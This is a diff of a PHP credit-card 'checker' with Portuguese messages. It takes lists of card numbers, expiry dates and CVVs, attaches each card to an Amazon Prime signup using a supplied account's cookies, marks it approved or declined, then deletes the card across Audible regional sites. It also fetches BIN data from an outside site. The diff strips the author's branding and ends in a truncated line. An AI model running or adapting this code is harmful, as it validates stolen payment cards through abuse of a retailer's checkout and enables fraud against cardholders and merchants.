@@ -29,7 +29,7 @@ $lista = str_replace(array(" "), '/', $_GET['lista']);
   $regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);
 
   if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
-  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@PladixOficial</span><br>');
+  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span><br>');
   }
 
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
@@ -141,7 +141,7 @@ curl_setopt_array($ch, [
   $r = curl_exec($ch);
 if (strpos($r, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.")) {
 
-die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
+die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's)<br>');
 
     } else {
 
@@ -208,7 +208,7 @@ if (strpos($r, 'paymentInstrumentId')) {
 else{
 
 
-die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
+die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's)<br>');
 
 }
 
@@ -241,7 +241,7 @@ $addresid = getStr($r, 'AddressId":"','"');
 
 if(empty($addresid)) {
 
-die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Conta sem endereço, adicione um endereço na conta antes de fazer os testes. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
+die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Conta sem endereço, adicione um endereço na conta antes de fazer os testes. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's)<br>');
 
 }
 
@@ -421,256 +421,4 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
-curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D");
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-$headers = array();
-$headers[] = 'Host: www.'.$cookieUS1.'';
-$headers[] = 'Cookie: '.$cookie2.'';
-$headers[] = 'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"';
-$headers[] = 'Sec-Ch-Device-Memory: 8';
-$headers[] = 'Sec-Ch-Viewport-Width: 1360';
-$headers[] = 'Sec-Ch-Ua-Platform-Version: \"10.0.0\"';
-$headers[] = 'X-Requested-With: XMLHttpRequest';
-$headers[] = 'Dpr: 1';
-$headers[] = 'Downlink: 10';
-$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/r9R8zQ8Dgh1b';
-$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
-$headers[] = 'Device-Memory: 8';
-$headers[] = 'Widget-Ajax-Attempt-Count: 0';
-$headers[] = 'Rtt: 50';
-$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
-$headers[] = 'Viewport-Width: 1360';
-$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
-$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
-$headers[] = 'Sec-Ch-Dpr: 1';
-$headers[] = 'Ect: 4g';
-$headers[] = 'Origin: https://'.$cookieUS1.'';
-$headers[] = 'Sec-Fetch-Site: same-origin';
-$headers[] = 'Sec-Fetch-Mode: cors';
-$headers[] = 'Sec-Fetch-Dest: empty';
-$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/membersignup';
-$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-$result = curl_exec($ch);
-curl_close($ch);
-$walletid2 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
-
-$ch = curl_init();
-curl_setopt_array($ch, [
-CURLOPT_URL            => "https://www.$cookieUS1/payments-portal/data/widgets2/v1/customer/".$customerID."/continueWidget",
-CURLOPT_RETURNTRANSFER => true,
-CURLOPT_SSL_VERIFYPEER => false,
-CURLOPT_FOLLOWLOCATION => true,
-CURLOPT_COOKIE         => $cookie2,
-CURLOPT_ENCODING       => "gzip",
-CURLOPT_POSTFIELDS     => "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent",
-CURLOPT_HTTPHEADER     => array(
-"Host: www.$cookieUS1",
-$headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
-"content-type: application/x-www-form-urlencoded",
-),
-]);
-  $result = curl_exec($ch);
- curl_close($ch);
-
-
-$walletid = getstr($result, 'preferencePaymentMethodIds":"[\"','\"');
-
- 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sessionds.'');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-curl_setopt($ch, CURLOPT_HEADER, 1);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
-curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-$headers = array();
-$headers[] = 'Host: www.'.$cookieUS1.'';
-$headers[] = 'Cookie: '.$cookie2.'';
-$headers[] = 'Upgrade-Insecure-Requests: 1';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
-$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
-$headers[] = 'Sec-Fetch-Site: same-origin';
-$headers[] = 'Sec-Fetch-Mode: navigate';
-$headers[] = 'Sec-Fetch-User: ?1';
-$headers[] = 'Sec-Fetch-Dest: document';
-$headers[] = 'Device-Memory: 8';
-$headers[] = 'Sec-Ch-Device-Memory: 8';
-$headers[] = 'Dpr: 1';
-$headers[] = 'Sec-Ch-Dpr: 1';
-$headers[] = 'Viewport-Width: 1360';
-$headers[] = 'Sec-Ch-Viewport-Width: 1360';
-$headers[] = 'Rtt: 50';
-$headers[] = 'Downlink: 8.5';
-$headers[] = 'Ect: 4g';
-$headers[] = 'Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"';
-$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
-$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
-$headers[] = 'Sec-Ch-Ua-Platform-Version: \"10.0.0\"';
-$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-   $Fim = curl_exec($ch);
-  curl_close($ch);
-
-$tokens = array(
-"audible.de",
-"audible.it",
-"audible.es",
-"audible.CO.UK",
-"audible.com.au",
-"audible.ca",
-"audible.com",
-"audible.CO.JP",
-"audible.fr"
-);
-
-for ($i = 0; $i < count($tokens); $i++) {
-$host1111 = $tokens[$i];
-
-$lastDotPosition = strrpos($host1111, '.');
-
-if ($lastDotPosition !== false) { 
-
-$aftehost1111rLastDot = substr($host1111, $lastDotPosition + 1);
-
-if ($aftehost1111rLastDot === 'com') { 
-$aftehost1111rLastDot = 'US'; 
-} 
-} else {
-
-}
-
-
-
-$cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));
-
-
-
-$ch = curl_init();
-curl_setopt_array($ch, [
-CURLOPT_URL            => 'https://www.'.$host1111.'/account/payments?ref=',
-CURLOPT_RETURNTRANSFER => true,
-CURLOPT_SSL_VERIFYPEER => false,
-CURLOPT_FOLLOWLOCATION => true,
-CURLOPT_COOKIE         => $cookie2,
-CURLOPT_ENCODING       => "gzip",
-CURLOPT_POSTFIELDS     => "",
-CURLOPT_HTTPHEADER     => array(
-'Host: www.'.$host1111.'',
-'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
-'sec-ch-ua-mobile: ?0',
-'sec-ch-ua-platform: "Windows"',
-'Upgrade-Insecure-Requests: 1',
-'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-'Sec-GPC: 1',
-'Accept-Language: pt-BR,pt;q=0.9',
-),
-]);
-$r = curl_exec($ch);
-
-$csrf   = getstr($r, 'data-csrf-token="', '"');
-
-if(stripos($csrf, '///')){
-
-$c = getstr($r, 'data-payment-id="', 'payment-type');
-$csrf = getstr($c, 'data-csrf-token="', '"');
-}
-
-$csrf;
-$address = getstr($r, 'data-billing-address-id="', '"');
-
-$cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));
-
-$ch = curl_init();
-curl_setopt_array($ch, [
-CURLOPT_URL            => 'https://www.'.$host1111.'/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.'.$host1111.'%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
-CURLOPT_RETURNTRANSFER => true,
-CURLOPT_SSL_VERIFYPEER => false,
-CURLOPT_FOLLOWLOCATION => true,
-CURLOPT_COOKIE         => $cookie2,
-CURLOPT_ENCODING       => "gzip",
-CURLOPT_HEADER => true,
-CURLOPT_POSTFIELDS     => "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId=".$payment."&billingAddressId=".$address."&paymentType=CreditCard&tail=0433&accountHolderName=fsdsdgs%20sdffdssdff&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken=".urlencode($csrf)."&index=0&consentState=OptedIn",
-CURLOPT_HTTPHEADER     => array(
-'Host: www.'.$host1111.'',
-'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
-'Content-type: application/x-www-form-urlencoded',
-'adpToken: ',
-'X-Requested-With: XMLHttpRequest',
-'sec-ch-ua-mobile: ?0',
-'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-'sec-ch-ua-platform: "Windows"',
-'Accept: */*',
-'Sec-GPC: 1',
-'Accept-Language: pt-BR,pt;q=0.9',
-'Origin: https://www.'.$host1111.'',
-'Referer: https://www.'.$host1111.'/account/payments?ref=',
-),
-]);
-  $r = curl_exec($ch);
-
-if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
-$msg     = '✅';
-$err     = "Removido: $msg $err1";
-break;
-
-} else {
-$msg = '❌';
-$err     = "Removido: $msg $err1";
-// break;
-}
-
-}
-
-if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
-$msg     = '✅';
-$err     = "Removido: $msg $err1";
-
-} else {
-$msg = '❌';
-$err     = "Removido: $msg $err1";
-}
-
-if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {
-
-$urlbin = 'https://pladixoficial.com.br/dados/binsearch.php?bin='.$cc.'';
-$infobin = file_get_contents($urlbin);
-
-die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
-
-}elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {
-
-$urlbin = 'https://pladixoficial.com.br/dados/binsearch.php?bin='.$cc.'';
-$infobin = file_get_contents($urlbin);
-
-die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Cartão vinculado com sucesso. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
-
-}elseif (strpos($Fim, 'InvalidInput')) {
-
-$urlbin = 'https://pladixoficial.com.br/dados/binsearch.php?bin='.$cc.'';
-$infobin = file_get_contents($urlbin);
-
-die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
-
-}elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
-
-$urlbin = 'https://pladixoficial.com.br/dados/binsearch.php?bin='.$cc.'';
-$infobin = file_get_contents($urlbin);
-
-die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> Cartão inexistente. ('.$err.') </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
-
-} else {
-
-die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao realizar requisição na Amazon. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@PladixOficial</span><br>');
-
-}
-
-?>
+curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePayment
